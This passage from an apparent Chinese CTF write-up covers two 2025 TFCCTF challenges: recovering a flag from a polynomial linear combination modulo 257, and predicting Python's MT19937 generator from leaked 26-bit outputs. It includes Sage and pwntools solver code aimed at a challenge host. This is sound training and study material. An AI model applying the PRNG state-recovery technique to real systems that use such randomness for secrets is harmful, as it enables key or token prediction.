</span></span><span class=line><span class=cl>    <span class=c1>// 3. 使用固定种子生成一个基础的随机多项式系统
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// srandom(0x539) 相当于 srandom(1337)，这意味着每次运行生成的“随机”多项式都是一样的
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>srandom</span><span class=p>(</span><span class=mi>1337</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// 生成4个基础的随机二次多项式 Q0, Q1, Q2, Q3
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 每个多项式包含8个变量 (x1, ..., x8)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Polynomial</span> <span class=n>base_polynomials</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>base_polynomials</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>generate_random_polynomial</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 4. 根据输入系数，对基础多项式进行线性组合，生成最终的4个多项式 P0, P1, P2, P3
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 计算逻辑如下：
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// P0 = input_coeffs[0]*Q0 + input_coeffs[1]*Q1 + input_coeffs[2]*Q2 + input_coeffs[3]*Q3
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// P1 = input_coeffs[4]*Q0 + input_coeffs[5]*Q1 + input_coeffs[6]*Q2 + input_coeffs[7]*Q3
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// ...以此类推
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Polynomial</span> <span class=n>final_polynomials</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>final_polynomials</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>create_empty_polynomial</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>j</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>j</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=o>++</span><span class=n>j</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// 将 input_coeffs[i*4 + j] 作为权重，与 base_polynomials[j] 相乘后累加
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>add_scaled_polynomial</span><span class=p>(</span><span class=o>&amp;</span><span class=n>final_polynomials</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=n>base_polynomials</span><span class=p>[</span><span class=n>j</span><span class=p>],</span> <span class=n>input_coeffs</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>4</span> <span class=o>+</span> <span class=n>j</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 5. 打印最终的4个多项式方程组
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;生成的方程组如下 (所有运算都在模 %d 意义下进行):</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MODULUS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>4</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;P%d(x1,x2,...,x8) = &#34;</span><span class=p>,</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>print_polynomial</span><span class=p>(</span><span class=n>final_polynomials</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34; (mod %d)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>MODULUS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// 6. 清理内存
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// ... 释放所有动态分配的内存 ...
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>对于每次运行，它会生成四个随机的八元多项式</p><div>$$
Q\_0,Q\_1,Q\_2,Q\_3
$$</div><p>（因为每次的随机数种子都是 1337，所以每一次运行得到的这四个多项式都是一样的），<br>然后对于输入的 <code>flag.txt</code>，它会取出前 16 个字节得到</p><div>$$
a\_0,a\_1,\cdots,a\_{16},
$$</div><p>然后计算：</p><div>$$
\begin{cases}
P\_0 \equiv a\_0Q\_0+a\_1Q\_1+a\_2Q\_2+a\_3Q\_3 \pmod{257}\\
P\_1 \equiv a\_4Q\_0+a\_5Q\_1+a\_6Q\_2+a\_7Q\_3 \pmod{257}\\
P\_2 \equiv a\_8Q\_0+a\_9Q\_1+a\_{10}Q\_2+a\_{11}Q\_3 \pmod{257}\\
P\_3 \equiv a\_{12}Q\_0+a\_{13}Q\_1+a\_{14}Q\_2+a\_{15}Q\_3 \pmod{257}
\end{cases}
$$</div><p>显然，我们令</p><div>$$
a\_0,a\_5,a\_{10},a\_{15} = 1,
$$</div><p>其余为 0 即可得到：</p><div>$$
\begin{cases}
P\_0 \equiv Q\_0 \pmod{257}\\
P\_1 \equiv Q\_1 \pmod{257}\\
P\_2 \equiv Q\_2 \pmod{257}\\
P\_3 \equiv Q\_3 \pmod{257}
\end{cases}
$$</div><p>那么我们只需要令 <code>flag.txt</code> 中的内容为<code>\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01</code></p><p>并使用 Pwn 的题目 <strong>MUCUSKY</strong> 的附件中给出的 <code>qemu</code> 来运行本题的程序，即可得到</p><div>$$
Q\_0,Q\_1,Q\_2,Q\_3
$$</div><p>再对比题目给出的</p><div>$$
P\_0,P\_1,P\_2,P\_3
$$</div>来解系数方程就可以得到 flag。<p>首先通过如下代码生成内容为<code>\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01</code>的<code>flag.txt</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./flag.txt&#34;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-TFCCTF/2.png alt=1></p><p>再分别求解系数方程就可以得到flag：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm</span> <span class=kn>import</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>257</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># R.&lt;x1, x2, x3, x4, x5, x6, x7, x8&gt; = Zmod(p)[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># P0 = 122 + 248*x1 + 32*x2 + 106*x3 + 16*x4 + 119*x5 + 228*x6 + 124*x7 + 196*x8 + 210*x1*x5 + 145*x1*x6 + 59*x1*x7 + 118*x1*x8 + 108*x2*x5 + 226*x2*x6 + 42*x2*x7 + 62*x2*x8 + 33*x3*x5 + 39*x3*x6 + 182*x3*x7 + 100*x3*x8 + 21*x4*x5 + 197*x4*x6 + 113*x4*x7 + 168*x4*x8 + 162*x5*x6 + 243*x5*x7 + 196*x5*x8 + 218*x6*x7 + 87*x6*x8 + 145*x7*x8</span>
</span></span><span class=line><span class=cl><span class=c1># P1 = 204 + 197*x1 + 178*x2 + 99*x3 + 33*x4 + 117*x5 + 57*x6 + 141*x7 + 61*x8 + 225*x1*x5 + 236*x1*x6 + 228*x1*x7 + 160*x1*x8 + 245*x2*x5 + 64*x2*x6 + 151*x2*x7 + 52*x2*x8 + 190*x3*x5 + 9*x3*x6 + 90*x3*x7 + 25*x3*x8 + 97*x4*x5 + 182*x4*x6 + 124*x4*x7 + 65*x4*x8 + 141*x5*x6 + 3*x5*x7 + 63*x5*x8 + 142*x6*x7 + 193*x6*x8 + 34*x7*x8</span>
</span></span><span class=line><span class=cl><span class=c1># P2 = 210 + 24*x1 + 256*x2 + 207*x3 + 244*x4 + 107*x5 + 184*x6 + 19*x7 + 180*x8 + 179*x1*x5 + 127*x1*x6 + 84*x1*x7 + 122*x1*x8 + 134*x2*x5 + 42*x2*x6 + 49*x2*x7 + 207*x2*x8 + 219*x3*x5 + 51*x3*x6 + 95*x3*x7 + 48*x3*x8 + 169*x4*x5 + 95*x4*x6 + 242*x4*x7 + 169*x4*x8 + 172*x5*x6 + 107*x5*x7 + 83*x5*x8 + 77*x6*x7 + 39*x6*x8 + 153*x7*x8</span>
</span></span><span class=line><span class=cl><span class=c1># P3 = 58 + 43*x1 + 101*x2 + 140*x3 + 194*x4 + 161*x5 + 110*x6 + 107*x7 + 199*x8 + 159*x1*x5 + 239*x1*x6 + 221*x1*x7 + 100*x1*x8 + 78*x2*x5 + 80*x2*x6 + 91*x2*x8 + 93*x3*x5 + 45*x3*x6 + 249*x3*x7 + 192*x3*x8 + 13*x4*x5 + 119*x4*x6 + 64*x4*x7 + 112*x4*x8 + 8*x5*x6 + 83*x5*x7 + 122*x5*x8 + 28*x6*x7 + 188*x6*x8 + 234*x7*x8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Q0= 122 + 16*x1 + 85*x2 + 46*x3 + 167*x4 + 111*x5 + 72*x6 + 162*x7 + 95*x8 + 79*x1*x5 + 150*x1*x6 + 151*x1*x7 + 126*x1*x8 + 117*x2*x5 + 25*x2*x6 + x2*x7 + 102*x2*x8 + 166*x3*x5 + 69*x3*x6 + 74*x3*x7 + 115*x3*x8 + 156*x4*x5 + 11*x4*x6 + 14*x4*x7 + 226*x4*x8 + 179*x5*x6 + 140*x5*x7 + 186*x5*x8 + 245*x6*x7 + 105*x6*x8 + 253*x7*x8</span>
</span></span><span class=line><span class=cl><span class=c1># Q1= 221 + 123*x1 + 148*x2 + 21*x3 + 254*x4 + 204*x5 + 255*x6 + 38*x7 + 97*x8 + 48*x1*x5 + 157*x1*x6 + 123*x1*x7 + 151*x1*x8 + 194*x2*x5 + 63*x2*x6 + 225*x2*x7 + 180*x2*x8 + 220*x3*x5 + 107*x3*x6 + 194*x3*x7 + 189*x3*x8 + 238*x4*x5 + 116*x4*x6 + 73*x4*x7 + 38*x4*x8 + 61*x5*x6 + 143*x5*x7 + 36*x5*x8 + 235*x6*x7 + 180*x6*x8 + 152*x7*x8</span>
</span></span><span class=line><span class=cl><span class=c1># Q2= 33 + 236*x1 + 12*x2 + 186*x3 + 244*x4 + 131*x5 + 222*x6 + 153*x7 + 67*x8 + 219*x1*x5 + 71*x1*x6 + 60*x1*x7 + 142*x1*x8 + 34*x2*x5 + 167*x2*x6 + 79*x2*x7 + 223*x2*x8 + 19*x3*x5 + 66*x3*x6 + 167*x3*x7 + 58*x3*x8 + 99*x4*x6 + 201*x4*x7 + 165*x4*x8 + 180*x5*x6 + 216*x5*x7 + 41*x5*x8 + 50*x6*x7 + 35*x6*x8 + 71*x7*x8</span>
</span></span><span class=line><span class=cl><span class=c1># Q3= 231 + 26*x1 + 149*x2 + 212*x3 + 62*x4 + 18*x5 + 212*x6 + 58*x7 + 191*x8 + 220*x1*x5 + 203*x1*x6 + 112*x1*x7 + 57*x1*x8 + 222*x2*x5 + 50*x2*x6 + 96*x2*x7 + 23*x2*x8 + 178*x3*x5 + 195*x3*x6 + 96*x3*x7 + 86*x3*x8 + 94*x4*x5 + 147*x4*x6 + 46*x4*x7 + 135*x4*x8 + 224*x5*x6 + 41*x5*x7 + 59*x5*x8 + 72*x6*x7 + 39*x6*x8 + 129*x7*x8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>A</span> <span class=o>=</span> <span class=n>matrix</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=p>[[</span><span class=mi>122</span><span class=p>,</span> <span class=mi>221</span><span class=p>,</span> <span class=mi>33</span><span class=p>,</span> <span class=mi>231</span><span class=p>],</span> <span class=p>[</span><span class=mi>16</span><span class=p>,</span> <span class=mi>123</span><span class=p>,</span> <span class=mi>236</span><span class=p>,</span> <span class=mi>26</span><span class=p>],</span> <span class=p>[</span><span class=mi>85</span><span class=p>,</span> <span class=mi>148</span><span class=p>,</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>149</span><span class=p>],</span> <span class=p>[</span><span class=mi>46</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>186</span><span class=p>,</span> <span class=mi>212</span><span class=p>]])</span>
</span></span><span class=line><span class=cl><span class=n>b1</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=p>[</span><span class=mi>122</span><span class=p>,</span> <span class=mi>248</span><span class=p>,</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>106</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>b2</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=p>[</span><span class=mi>204</span><span class=p>,</span> <span class=mi>197</span><span class=p>,</span> <span class=mi>178</span><span class=p>,</span> <span class=mi>99</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>b3</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=p>[</span><span class=mi>210</span><span class=p>,</span> <span class=mi>24</span><span class=p>,</span> <span class=mi>256</span><span class=p>,</span> <span class=mi>207</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>b4</span> <span class=o>=</span> <span class=n>vector</span><span class=p>(</span><span class=n>Zmod</span><span class=p>(</span><span class=n>p</span><span class=p>),</span> <span class=p>[</span><span class=mi>58</span><span class=p>,</span> <span class=mi>43</span><span class=p>,</span> <span class=mi>101</span><span class=p>,</span> <span class=mi>140</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bs</span> <span class=o>=</span> <span class=p>[</span><span class=n>b1</span><span class=p>,</span> <span class=n>b2</span><span class=p>,</span> <span class=n>b3</span><span class=p>,</span> <span class=n>b4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>bs</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>v</span> <span class=o>=</span> <span class=n>A</span><span class=o>.</span><span class=n>solve_right</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>vi</span> <span class=ow>in</span> <span class=n>v</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>vi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=why-the-bear-has-no-tail>WHY THE BEAR HAS NO TAIL</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret_stuff</span> <span class=kn>import</span> <span class=n>FLAG</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Challenge</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>n</span> <span class=o>=</span> <span class=mi>2</span><span class=o>**</span><span class=mi>26</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>k</span> <span class=o>=</span> <span class=mi>2000</span>
</span></span><span class=line><span class=cl>        <span class=c1># self.words = [i for i in range(n)]</span>
</span></span><span class=line><span class=cl>        <span class=c1># self.buf = random.choices(self.words, k=k)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_sample</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>index</span> <span class=o>&gt;</span> <span class=bp>self</span><span class=o>.</span><span class=n>k</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Reached end of buffer&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;uhhh here is something but idk what u finna do with it: &#34;</span><span class=p>,</span> <span class=n>random</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>n</span><span class=p>),</span> <span class=n>k</span><span class=o>=</span><span class=mi>1</span><span class=p>)[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_flag</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>idxs</span> <span class=o>=</span> <span class=p>[</span><span class=n>i</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>256</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>idxs</span><span class=p>,</span> <span class=n>k</span><span class=o>=</span><span class=nb>len</span><span class=p>(</span><span class=n>FLAG</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>omlet</span> <span class=o>=</span> <span class=p>[</span><span class=nb>ord</span><span class=p>(</span><span class=n>FLAG</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>FLAG</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;uhh ig I can give you this if you really want it... chat?&#34;</span><span class=p>,</span> <span class=n>omlet</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>loop</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;what you finna do, huh?&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;1. guava&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;2. muava&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>choice</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;Enter your choice: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>choice</span> <span class=o>==</span> <span class=s2>&#34;1&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>get_sample</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>choice</span> <span class=o>==</span> <span class=s2>&#34;2&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>get_flag</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Invalid choice&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=n>Challenge</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span><span class=o>.</span><span class=n>loop</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>从题目中的代码可以得到，有2000次机会可以获取一个随机数值，这个值的范围在<code>0~2^26</code>之间，即题目中的程序使用<code>random.choices(range(self.n), k=1)</code>随机获取<code>0~2^26</code>之间的一个随机值。</p><p>通过查看random.choices()这个函数，发现该函数会调用<code>floor(random() * n)</code>这个函数对这选择<code>0~2^26</code>这个列表中的一个数据，而<code>0~2^26</code>这个列表是按顺序排列的。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>return</span> <span class=p>[</span><span class=n>population</span><span class=p>[</span><span class=n>floor</span><span class=p>(</span><span class=n>random</span><span class=p>()</span> <span class=o>*</span> <span class=n>n</span><span class=p>)]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>_repeat</span><span class=p>(</span><span class=kc>None</span><span class=p>,</span> <span class=n>k</span><span class=p>)]</span>
</span></span></code></pre></td></tr></table></div></div><p>所以选择choice为1的时候本质上就是获得floor(random() * n)的值，接下来就需要看random()这个函数是如何生成随机数的。而Python的随机数模块使用的是MT19937算法，所以此题考察的就是MT19937算法的预测或者恢复（预测或者恢复主要是看输入choice为2的时机）。</p><p>通过询问AI得知，Python的random模块有些是直接使用C语言实现的，这些用C语言实现的随机数函数在编译Python解释器的时候已经被编译了，题目中的random()这个函数就是C语言实现的。所以需要到CPython相关的github仓库查看一下源码。在CPython中的这个仓库中可以找到源码 <a href=https://github.com/python/cpython/blob/main/Modules/_randommodule.c>https://github.com/python/cpython/blob/main/Modules/_randommodule.c</a></p><p><img src=/img/2025-TFCCTF/3.png alt=1></p><p>从源码中就可以看到random()在生成的时候相当于调用了俩次random.randbytes(32)，其中a取高27位，b取高26位。总的来说choice选择1，得到的就是floor(random() * n)的值，也就是能得到MT19937的26bit的值，但是连续选择choice1得到的26bit并不是连续的。对于已知不连续的nbit的值，本质上是线性方程组求解，求解的原理在这篇文章中情况三有比较详细的说明<a href=https://xenny.wiki/posts/crypto/PRNG/MT19937.html>MT19937分析</a>，同时这篇博客有类似的题型https://tangcuxiaojikuai.xyz/post/69eaef2e.html</p><p>得到思路后就可以先使用脚本收集足够的数据以及密文，对于MT19937一般题型来说只需要泄露19968位数就能得到MT19937的624个状态，但是线性方程组求解使用19968位解出一般是解不出来正确结果。需要得到更多的位数。（本题测试可知已知32000位数是能得到准确的624个状态的）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>2</span><span class=o>**</span><span class=mi>26</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;the-bear-45589d3cbdcdfa7c.challs.tfcctf.com&#34;</span><span class=p>,</span><span class=mi>1337</span><span class=p>,</span><span class=n>ssl</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>candidate</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1550</span><span class=p>):</span>
